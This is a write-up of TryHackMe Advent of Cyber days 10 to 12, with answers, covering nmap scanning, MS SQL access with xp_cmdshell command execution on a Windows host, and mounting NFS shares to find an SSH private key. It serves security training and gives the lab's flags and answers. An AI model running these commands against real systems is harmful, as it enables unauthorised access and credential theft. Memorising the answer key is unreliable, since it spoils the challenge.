{% endhint %}

### \[Day 10] Offensive Is The Best Defense

#### Help McSkidy and run `nmap -sT 10.10.6.156`. How many ports are open between 1 and 100?

```bash
nmap -n -p1-100 10.10.6.156
```

![](<../.gitbook/assets/Screenshot from 2022-03-01 21-55-04.png>)

{% hint style="success" %}
`2`
{% endhint %}

#### What is the smallest port number that is open?

{% hint style="success" %}
22
{% endhint %}

#### What is the service related to the highest port number you found in the first question?

{% hint style="success" %}
`http`
{% endhint %}

#### Now run `nmap -sS 10.10.6.156`. Did you get the same results?

```
sudo nmap -n -p1-100 10.10.6.156
```

![sudo nmap -n -p1-100 10.10.6.156](<../.gitbook/assets/Screenshot from 2022-03-01 21-56-49.png>)

{% hint style="success" %}
`Y`
{% endhint %}

#### If you want Nmap to detect the version info of the services installed, you can use nmap -sV 10.10.6.156. What is the version number of the web server?

```bash
nmap -n -sV -p80 10.10.6.156
```

![nmap -n -sV -p80 10.10.6.156](<../.gitbook/assets/Screenshot from 2022-03-01 21-58-22.png>)

{% hint style="success" %}
`Apache httpd 2.4.49`
{% endhint %}

#### By checking the [vulnerabilities related to the installed web server](https://httpd.apache.org/security/vulnerabilities\_24.html), you learn that there is a critical vulnerability that allows path traversal and remote code execution. Now you can tell McSkidy that Grinch Enterprises used this vulnerability. What is the CVE number of the vulnerability that was solved in version 2.4.51?

![https://httpd.apache.org/security/vulnerabilities\_24.html](<../.gitbook/assets/Screenshot from 2022-03-01 22-04-01.png>)

{% hint style="success" %}
`CVE-2021-42013`
{% endhint %}

#### You are putting the pieces together and have a good idea of how your web server was exploited. McSkidy is suspicious that the attacker might have installed a backdoor. She asks you to check if there is some service listening on an uncommon port, i.e. outside the 1000 common ports that Nmap scans by default. She explains that adding `-p1-65535` or `-p-` will scan all 65,535 TCP ports instead of only scanning the 1000 most common ports. What is the port number that appeared in the results now?

```bash
nmap -n -p- -T4 10.10.6.156
```

![](<../.gitbook/assets/Screenshot from 2022-03-01 22-28-27.png>)

{% hint style="success" %}
`20212`
{% endhint %}

#### What is the name of the program listening on the newly discovered port?

```bash
nmap -n -sV -p20212 10.10.6.156
```

![](<../.gitbook/assets/Screenshot from 2022-03-01 22-28-51.png>)

{% hint style="success" %}
`telnetd`
{% endhint %}

### \[Day 11] Where Are The Reindeers?

#### You decided that the first step would be to check the running services on `10.10.251.132`. You resort to yesterday’s tool, Nmap.

#### Knowing that `10.10.251.132` is a MS Windows system, you expect it to not respond to ping probes by default; therefore, you need to add `-Pn` to your `nmap` command to perform the scan. This instructs Nmap to skip pinging the target to see if the host is reachable. Without this option, Nmap will assume the target host is offline and not proceed with scanning.

#### There is an open port related to MS SQL Server accessible over the network. What is the port number?

```bash
nmap -n -Pn 10.10.251.132
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-01-54.png>)

{% hint style="success" %}
`1433`
{% endhint %}

#### Knowing the MS SQL Server is running and accessible over the network, we want to check if our username and password are still valid. Using the AttackBox terminal, we will use the command `sqsh` (pronounced skwish), an interactive database shell.

#### If the connection is successful, you will get a prompt. What is the prompt that you have received?

```bash
sqsh -U sa -P t7uLKzddQzVjVFJp -S 10.10.251.132
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-09-32.png>)

{% hint style="success" %}
`1>`
{% endhint %}

#### McDatabaseAdmin told us the database name is reindeer and it has three tables:

1. `names`
2. `presents`
3. `schedule`

#### In the terminal below, we executed the query, `SELECT * FROM reindeer.dbo.names;`. This SQL query should dump all the contents of the table `names` from the database `reindeer`. Note that the `;` indicates the end of the SQL query, while `go` sends a SQL batch to the database.

```bash
> SELECT * FROM reindeer.dbo.names;
> go
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-14-02.png>)

#### We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?

{% hint style="success" %}
`Rudolph`
{% endhint %}

#### Check the table `schedule`. What is the destination of the trip scheduled on December 7?

```bash
> SELECT * FROM reindeer.dbo.schedule;
> go
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-17-20.png>)

{% hint style="success" %}
`Prague`
{% endhint %}

#### Check the table presents. What is the quantity available for the present “Power Bank”?

```bash
> SELECT * FROM reindeer.dbo.presents;
> go
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-18-47.png>)

{% hint style="success" %}
`25000`
{% endhint %}

#### You have done fantastic work! You have helped McDatabaseAdmin retrieve the schedule! Now, let’s see if we can run MS Windows commands while interacting with the database. Some MS SQL Servers have `xp_cmdshell` enabled. If this is the case, we might have access to something similar to a command prompt.

#### The command syntax is `xp_cmdshell 'COMMAND';`. Let’s try a simple command, `whoami`, which shows the user running the commands. In the terminal output below, after connecting to MS SQL Server, we tried `xp_cmdshell 'whoami';`, and we can see that the user is `nt service\mssqlserver`. This means that any command we pass to `xp_cmdshell` will run as `nt service\mssqlserver`.

```bash
> xp_cmdshell 'whoami';
> go
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-23-25.png>)

#### We can run other commands that we can execute on the MS Windows command line. For example, we can use `dir` to list files and directories and `type filename` to display the contents of a file. Consider the example in the terminal window below where we reveal the contents of the text file `WindowsUpdate.log`.

![](<../.gitbook/assets/Screenshot from 2022-03-02 01-26-13.png>)

#### There is a flag hidden in the `grinch` user's home directory. What are its contents?

```bash
1> xp_cmdshell 'dir C:\Users\grinch';
2> go
1> xp_cmdshell 'dir C:\Users\grinch\Documents';
2> go
1> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
2> go
```

{% hint style="success" %}
`THM{YjtKeUy2qT3v5dDH}`
{% endhint %}

### \[Day 12] Sharing Without Caring

#### Scan the target server with the IP `10.10.150.242`. Remember that MS Windows hosts block pings by default, so we need to add `-Pn`, for example, `nmap -Pn 10.10.150.242` for the scan to work correctly. How many TCP ports are open?

```bash
nmap -n -Pn 10.10.150.242
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 10-27-14.png>)

{% hint style="success" %}
`7`
{% endhint %}

#### Network File System (NFS) is a protocol that allows the ability to transfer files between different computers and is available on many systems, including MS Windows and Linux. Consequently, NFS makes it easy to share files between various operating systems.

#### In the scan results you received earlier, you should be able to spot NFS or mountd, depending on whether you used the `-sV` option with Nmap or not. Which port is detected by Nmap as NFS or using the mountd service?

{% hint style="success" %}
2049
{% endhint %}

#### Now that we have discovered an NFS service is listening, let’s check what files are being shared. We can do this using the command `showmount`. In the terminal below, we run `showmount -e 10.10.150.242`.

```bash
showmount -e 10.10.150.242
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 10-31-44.png>)

#### As we can see in the terminal output above, we have two shares, `/share` and `/my-notes`. After you have started the attached machine, use the AttackBox terminal to discover the shares on `10.10.150.242`.

#### How many shares did you find?

{% hint style="success" %}
`4`
{% endhint %}

#### How many shares show “everyone”?

{% hint style="success" %}
`3`
{% endhint %}

#### Let’s try to mount the shares we have discovered. We can create a directory on the AttackBox using `mkdir tmp1`, where `tmp1` is the directory’s name. Then we can use this directory  we created to mount the public NFS share using: `mount 10.10.150.242:/my-notes tmp1`.

```bash
mkdir tmp1
sudo mount 10.10.150.242:/my-notes tmp1
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 10-36-30.png>)

#### We can see that the mounting has failed. `my-notes` is not public and requires specific authentication mechanisms that we don’t have access to. Let’s try again with the other folder, `share`.

```bash
sudo mount 10.10.150.242:/share tmp1
```

#### We didn’t get any error messages, so it was a success. Let’s go inside the share to see what’s inside it.

#### There are two text files. What is the title of file 2680-0.txt?

```bash
ls tmp1
head tmp1/2680-0.txt
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 10-41-37.png>)

{% hint style="success" %}
`Meditations`
{% endhint %}

#### It seems that Grinch Enterprises has forgotten their SSH keys on our system. One of the shares contains a private key used for SSH authentication (id\_rsa). What is the name of the share?

```bash
mkdir tmp2
sudo mount 10.10.150.242:/confidential tmp2
ls tmp2
ls tmp2/ssh
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 10-44-35.png>)

{% hint style="success" %}
`confidential`
{% endhint %}

#### We can calculate the MD5 sum of a file using `md5sum FILENAME`. What is the MD5 sum of `id_rsa`?

```bash
md5sum tmp2/ssh/id_rsa
```

![](<../.gitbook/assets/Screenshot from 2022-03-02 10-45-27.png>)
